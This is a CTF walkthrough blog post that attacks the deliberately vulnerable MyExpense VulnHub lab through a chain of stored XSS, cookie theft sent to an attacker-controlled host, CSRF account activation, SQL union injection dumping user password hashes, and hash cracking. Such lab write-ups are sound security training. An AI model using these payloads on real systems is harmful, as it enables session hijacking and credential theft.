---
layout: single
title: MyExpense - VulnHub
excerpt: MyExpense is a deliberately vulnerable web application that allows you to train in detecting and exploiting different web vulnerabilities. Unlike a more traditional "challenge" application (which allows you to train on a single specific vulnerability), MyExpense contains a set of vulnerabilities you need to exploit to achieve the whole scenario.
date: 2024-07-04
classes: wide
header:
  teaser: /assets/images/vulnhub.png
  teaser_home_page: true
categories:
  - ctf
  - hackthebox
tags:
  - mysql
  - xss
  - xsrf
---
From description we have the credentials
`samuel/fzghn4lw`
# Scan
```
General scan
PORT      STATE SERVICE REASON
   7   │ 80/tcp    open  http    syn-ack ttl 64
   8   │ 38575/tcp open  unknown syn-ack ttl 64
   9   │ 53717/tcp open  unknown syn-ack ttl 64
  10   │ 54457/tcp open  unknown syn-ack ttl 64
  11   │ 59781/tcp open  unknown syn-ack ttl 64
```
# 80
## Focused scan
```
PORT      STATE SERVICE VERSION
   6   │ 80/tcp    open  http    Apache httpd 2.4.25 ((Debian))
   7   │ |_http-server-header: Apache/2.4.25 (Debian)
   8   │ |_http-title: Futura Business Informatique GROUPE - Conseil en ing\xC3\xA9nierie
   9   │ | http-robots.txt: 1 disallowed entry
  10   │ |_/admin/admin.php
  11   │ | http-cookie-flags:
  12   │ |   /:
  13   │ |     PHPSESSID:
  14   │ |_      httponly flag not set
  ```
## Checking `robots.txt`
```
User-agent: *
Disallow: /admin/admin.php
```

Fuzzing the page we just found `/admin` like above.

## /admin/admin.php

![](/assets/images/Pasted%20image%2020240703173824.png)

We found an admin panel.
We have more info about us.
`slamotte	Samuel	Lamotte	slamotte@futuraBI.fr	Collaborator	2019-12-03 17:08:09`
We don't have permissions to inactive our user

![](/assets/images/Pasted%20image%2020240703174158.png)

Trying to login using `slamotte` and `fzghn4lw`.

![](/assets/images/Pasted%20image%2020240703175002.png)

Create a new account.
And the button is disable, but we can inspect the html code.

![](/assets/images/Pasted%20image%2020240703175519.png)

And delete the disable part.

![](/assets/images/Pasted%20image%2020240703175631.png)

Now the button is enable and we can create the new account.

![](/assets/images/Pasted%20image%2020240703175654.png)

We are in the system with an inactive account.

![](/assets/images/Pasted%20image%2020240703175913.png)

Trying XSS creating a new test user with the fields. Don't forget able the button.

![](/assets/images/Pasted%20image%2020240703180410.png)

Check the admin panel and we have a XSS.

![](/assets/images/Pasted%20image%2020240703180550.png)
# XSS
To exploit this XSS we need the interaction of a some user, to check if some user is checking the admin panel.
Create a new user with this code on the two last fields.
```js
<script src="http://192.168.122.192/test.js"></script>
```
This code is trying to get the file `test.js` from our server, if someone check the admin panel, the code is executed and we can watch the request on our server.
Mount a server on the attacker machine.
```python
python -m http.server 80
```

## Get the cookie
now in the js file put
```js
var request = new XMLHttpRequest();
request.open('GET', 'http://attackerIP/?cookie=' + document.cookie);
request.send();
```
`PHPSESSID=0iap4q3kqsctljgp13vrcbi1f2`
`0gp9edhmbd1lnnjejhitk4mk65`
`h4a1tpdbhnfjss32mhup0v6d37`
`knjvvrlahr23emlepkqn800ac2`
We got some cookies, one of them is the admin account, but if use that cookie, we can't login, because the system admit just 1 login.

# XSRF
Activate account
Trying another way, if we try to activate the account we have.

![](/assets/images/Pasted%20image%2020240704171243.png)

Now we know that the admin is constantly visiting the admin panel, so we can set the XSS to the user make a request to the url above.
```js
var request = new XMLHttpRequest();
request.open('GET', 'http://192.168.122.204/admin/admin.php?id=11&status=active');
request.send();
```
Now we start the python server again ans wait. After a while we can see that the admin make the request and our account should be activate.

![](/assets/images/Pasted%20image%2020240704171856.png)

After login in, in the expense reports, we see the report and now submit it.

![](/assets/images/Pasted%20image%2020240704172227.png)
Some has to approve our report, and we see in the profile settings that Manen RIviere is our Manager.

![](/assets/images/Pasted%20image%2020240704172450.png)
We supposs to Manon has an panel to approve our report, so we'll try to get the Manon cookie sending an js in the message field. Again listen on python server.

![](/assets/images/Screenshot_20240704_181923.png)
We have a few cookies, one of them is the Manager cookie.

![](/assets/images/Screenshot_20240704_182401.png)

Now validate the report. On the green button.

We need that the financial person approve the payment
in the rennes page we will try sqli.

# SQLi
We break the query adding this.

![](/assets/images/Screenshot_20240704_184024.png)
Now get the information from db
## DB names
information_schema,myexpense,mysql,performance_schema
## myexpense DB
expense,message,site,user
### User Table
`http://192.168.122.204/site.php?id=2%20union%20select%201,group_concat(column_name)%20FROM%20information_schema.columns%20WHERE%20table_name%20=%20%27user%27--%20-`

user_id,**username**,**password**,role,lastname,firstname,site_id.....e,max_statement_time

## Username and password
**afoulon:124922b5d61dd31177ec83719ef8110a**
**pbaudouin:64202ddd5fdea4cc5c2f856efef36e1a**
rlefrancois:ef0dafa5f531b54bf1f09592df1cd110
mriviere:d0eeb03c6cc5f98a3ca293c1cbf073fc
mnguyen:f7111a83d50584e3f91d85c3db710708
pgervais:2ba907839d9b2d94be46aa27cec150e5
placombe:04d1634c2bfffa62386da699bb79f191
triou:6c26031f0e0859a5716a27d2902585c7
broy:b2d2e1b2e6f4e3d5fe0ae80898f5db27
brenaud:2204079caddd265cedb20d661e35ddc9
slamotte:21989af1d818ad73741dfdbef642b28f
nthomas:a085d095e552db5d0ea9c455b4e99a30
vhoffmann:ba79ca77fe7b216c3e32b37824a20ef3
rmasson:ebfc0985501fee33b9ff2f2734011882
test:912b7bc95fb9e6885a4685746433f39a
test2:088e03d5b2537942a15e4842d27eb49d

Checking the admin panel again to see all accounts, we are interested on the `Finalcial approvers` accounts and we will try to crack the passwords of them.

`afoulon	Aristide	Foulon	afoulon@futuraBI.fr	Financial approver	2019-12-03 17:08:09`

`pbaudouin	Paul	Baudouin	pbaudouin@futuraBI.fr	Financial approver	2019-12-03 17:08:09`

# Cracking hashes
Checking hashes.com

afoulon:wq6hblv3
pbaudouin:HackMe

Login in like `afoulon` and he don't have our report. But `pbaudouin` has it.

![](/assets/images/Screenshot_20240704_205514.png)

# Flag
Login as Samuel and get the flag.

![](/assets/images/Screenshot_20240704_205739.png)
